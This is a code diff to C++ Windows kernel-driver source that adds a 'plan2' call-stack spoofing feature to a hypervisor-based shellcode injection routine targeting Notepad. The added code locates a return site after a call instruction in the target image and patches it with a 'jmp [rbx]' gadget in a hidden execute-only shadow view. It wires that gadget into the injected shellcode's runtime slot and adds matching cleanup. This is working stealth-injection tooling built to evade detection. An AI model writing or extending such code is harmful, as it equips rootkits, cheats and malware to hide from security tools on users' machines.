@@ -1,6 +1,7 @@
 ﻿#include "VtEngine.h"
 #include "../Security/Utils.h"
 #include "../Core/MachenikeString.h"
+#include "../Core/StackSpoofConfig.h"
 
 extern "C" {
 #include "../vt/VtResidentPayload/hooks/hde64.h"
@@ -27,6 +28,7 @@ static SIZE_T s_NotepadShellcodeSize = 0;
 static ULONG64 s_NotepadShellcodeDataBase = 0;
 static SIZE_T s_NotepadShellcodeDataSize = 0;
 static ULONG64 s_NotepadShellcodeHookVa = 0;
+static ULONG64 s_NotepadGhostRetVa = 0;
 static UCHAR s_NotepadShellcodeOriginalHook[64] = {};
 static ULONG s_NotepadShellcodeOriginalHookSize = 0;
 static ULONG64 s_NotepadShellcodeViewPages[64] = {};
@@ -130,8 +132,9 @@ static BOOLEAN VtReadProcessPrivate(_In_ PEPROCESS Process,
 }
 
 #if ENABLE_DEBUG_SHELLCODE_IMAGE && VT_DEBUG_NOTEPAD_NPT_TEST
-// DebugShellcode::RuntimeSlot 的固定用户态布局：value(0x00)、input(0x08)、state(0x10)。
+// DebugShellcode::RuntimeSlot 的固定用户态布局；state 偏移保持 ADR-0142 契约不变。
 static constexpr ULONG kRuntimeSlotStateOffset = 0x10;
+static constexpr ULONG kRuntimeSlotPlanOffset = 0x34;
 #endif
 
 #if ENABLE_DEBUG_SHELLCODE_IMAGE && VT_DEBUG_NOTEPAD_NPT_TEST
@@ -1328,6 +1331,8 @@ BOOLEAN VtEngine::RunNotepadNptTest(_In_ PMACHENIKE_KERNEL_INTERFACE UserVar)
     ULONG hookPatchSize = 0;
     UCHAR originalHook[64] = {};
     BOOLEAN viewsInstalled = FALSE;
+    BOOLEAN ghostInstalled = FALSE;
+    ULONG64 ghostRetVa = 0;
 
     DBG("[*] Notepad NPT test: target pid=%llu image=0x%llX cr3=0x%llX", pid, imageBase, cr3);
 
@@ -1386,10 +1391,97 @@ BOOLEAN VtEngine::RunNotepadNptTest(_In_ PMACHENIKE_KERNEL_INTERFACE UserVar)
     DBG("[+] Notepad NPT test: .text copied and runtime patched text_base=0x%llX entry=0x%llX dispatch=0x%llX resume=0x%llX",
         codeBase, shellcodeEntryVa, runtimeDispatchVa, resumeVa);
 
+    const ULONG spoofPlan = VT_SHELLCODE_SPOOF_PLAN;
+    if (!VtWriteProcessPrivate(
+            process,
+            dataBase + kRuntimeSlotPlanOffset,
+            &spoofPlan,
+            sizeof(spoofPlan)))
+    {
+        DBG("[-] Notepad NPT test: RuntimeSlot plan write failed plan=%lu va=0x%llX",
+            spoofPlan, dataBase + kRuntimeSlotPlanOffset);
+        VtEmbeddedFree(process, &dataBase, &dataSize);
+        VtEmbeddedFree(process, &codeBase, &codeSize);
+        UserVar->Func.ObfDereferenceObject(process);
+        InterlockedExchange(&s_NotepadNptState, 0);
+        return FALSE;
+    }
+    DBG("[+] Notepad NPT test: RuntimeSlot plan=%lu written va=0x%llX",
+        spoofPlan, dataBase + kRuntimeSlotPlanOffset);
+
+#if VT_SHELLCODE_SPOOF_PLAN == 2
+    if (VT_SHELLCODE_PLAN2_GHOST_RET_RVA == 0 ||
+        imageBase > MAXULONG64 - static_cast<ULONG64>(VT_SHELLCODE_PLAN2_GHOST_RET_RVA))
+    {
+        DBG("[-] Notepad NPT test: plan2 GhostRetRva is not configured");
+        VtEmbeddedFree(process, &dataBase, &dataSize);
+        VtEmbeddedFree(process, &codeBase, &codeSize);
+        UserVar->Func.ObfDereferenceObject(process);
+        InterlockedExchange(&s_NotepadNptState, 0);
+        return FALSE;
+    }
+    ghostRetVa = imageBase + static_cast<ULONG64>(VT_SHELLCODE_PLAN2_GHOST_RET_RVA);
+    if ((ghostRetVa & (PAGE_SIZE - 1)) > PAGE_SIZE - 2 || ghostRetVa < imageBase)
+    {
+        DBG("[-] Notepad NPT test: plan2 GhostRetVa is not a same-page 2-byte return site va=0x%llX",
+            ghostRetVa);
+        VtEmbeddedFree(process, &dataBase, &dataSize);
+        VtEmbeddedFree(process, &codeBase, &codeSize);
+        UserVar->Func.ObfDereferenceObject(process);
+        InterlockedExchange(&s_NotepadNptState, 0);
+        return FALSE;
+    }
+
+    UCHAR callPrefix[6] = {};
+    const BOOLEAN callRead = ghostRetVa >= imageBase + 6 &&
+        VtReadProcessPrivate(process, ghostRetVa - 6, callPrefix, sizeof(callPrefix));
+    const BOOLEAN directCall = callRead && callPrefix[1] == 0xE8;
+    const BOOLEAN indirectCall = callRead && callPrefix[0] == 0xFF && callPrefix[1] == 0x15;
+    if (!directCall && !indirectCall)
+    {
+        DBG("[-] Notepad NPT test: plan2 GhostRetVa is not immediately after E8/FF15 call va=0x%llX",
+            ghostRetVa);
+        VtEmbeddedFree(process, &dataBase, &dataSize);
+        VtEmbeddedFree(process, &codeBase, &codeSize);
+        UserVar->Func.ObfDereferenceObject(process);
+        InterlockedExchange(&s_NotepadNptState, 0);
+        return FALSE;
+    }
+
+    if (!EhInstall((ULONG64)(ULONG_PTR)process, ghostRetVa, FALSE,
+                   VT_EH_VIEW_EXEC_SHADOW_READ_ORIGINAL))
+    {
+        DBG("[-] Notepad NPT test: plan2 GhostRetVa EhInstall failed va=0x%llX", ghostRetVa);
+        VtEmbeddedFree(process, &dataBase, &dataSize);
+        VtEmbeddedFree(process, &codeBase, &codeSize);
+        UserVar->Func.ObfDereferenceObject(process);
+        InterlockedExchange(&s_NotepadNptState, 0);
+        return FALSE;
+    }
+    const UCHAR ghostPatch[] = { 0xFF, 0x23 };
+    if (!EhWrite((ULONG64)(ULONG_PTR)process, ghostRetVa, ghostPatch, sizeof(ghostPatch)) ||
+        !VtWriteProcessPrivate(process, dataBase + 0x28, &ghostRetVa, sizeof(ghostRetVa)))
+    {
+        EhRemove((ULONG64)(ULONG_PTR)process, ghostRetVa);
+        DBG("[-] Notepad NPT test: plan2 GhostRetVa shadow patch or slot write failed va=0x%llX",
+            ghostRetVa);
+        VtEmbeddedFree(process, &dataBase, &dataSize);
+        VtEmbeddedFree(process, &codeBase, &codeSize);
+        UserVar->Func.ObfDereferenceObject(process);
+        InterlockedExchange(&s_NotepadNptState, 0);
+        return FALSE;
+    }
+    ghostInstalled = TRUE;
+    DBG("[+] Notepad NPT test: plan2 GhostRetVa installed va=0x%llX source=%s",
+        ghostRetVa, directCall ? "E8" : "FF15");
+#endif
+
     s_NotepadShellcodeViewPageCount = 0;
     if (!VtEmbeddedInstallViews(process, codeBase))
     {
         DBG("[-] Notepad NPT test: shellcode dual-view install failed (pid=%llu)", pid);
+        if (ghostInstalled)
+            EhRemove((ULONG64)(ULONG_PTR)process, ghostRetVa);
         VtEmbeddedRemoveViews(process);
         VtEmbeddedFree(process, &dataBase, &dataSize);
         VtEmbeddedFree(process, &codeBase, &codeSize);
@@ -1416,6 +1508,8 @@ BOOLEAN VtEngine::RunNotepadNptTest(_In_ PMACHENIKE_KERNEL_INTERFACE UserVar)
             restored, hookPatchSize);
         DBG("[-] Notepad NPT test: WndProc hook install failed (pid=%llu rva=0x%llX va=0x%llX)",
             pid, hookVa - imageBase, hookVa);
+        if (ghostInstalled)
+            EhRemove((ULONG64)(ULONG_PTR)process, ghostRetVa);
         if (viewsInstalled)
             VtEmbeddedRemoveViews(process);
         s_ShellcodeDualViewProcess = 0;
@@ -1438,6 +1532,7 @@ BOOLEAN VtEngine::RunNotepadNptTest(_In_ PMACHENIKE_KERNEL_INTERFACE UserVar)
     s_NotepadShellcodeDataBase = dataBase;
     s_NotepadShellcodeDataSize = dataSize;
     s_NotepadShellcodeHookVa = hookVa;
+    s_NotepadGhostRetVa = ghostRetVa;
     InterlockedExchange(&s_NotepadNptState, 2);
     DBG("[+] Notepad NPT test: embedded .text-only shellcode mapped and transparent WndProc hook installed (pid=%llu wndproc_rva=0x%llX hook=0x%llX resume=0x%llX shellcode=0x%llX data=0x%llX patch=%lu views=%lu hook_dual_view=%d shellcode_dual_view=%d)",
         pid, hookVa - imageBase, hookVa, resumeVa, shellcodeEntryVa, dataBase,
@@ -1537,6 +1632,13 @@ VOID VtEngine::CleanupNotepadNptTest(VOID)
             RemoveHookToShellcode(process, s_NotepadShellcodeHookVa);
             DBG("[*] Notepad NPT test: direct original-page hook metadata cleared");
 #endif
+        }
+        if (s_NotepadGhostRetVa)
+        {
+            const BOOLEAN ghostRemoved = IsActive() && EhRemove(process, s_NotepadGhostRetVa);
+            DBG("[*] Notepad NPT test: plan2 GhostRetVa removed va=0x%llX result=%d",
+                s_NotepadGhostRetVa, ghostRemoved);
+            s_NotepadGhostRetVa = 0;
         }
         VtEmbeddedRemoveViews(s_NotepadShellcodeProcess);
         VtEmbeddedFree(s_NotepadShellcodeProcess, &s_NotepadShellcodeDataBase, &s_NotepadShellcodeDataSize);
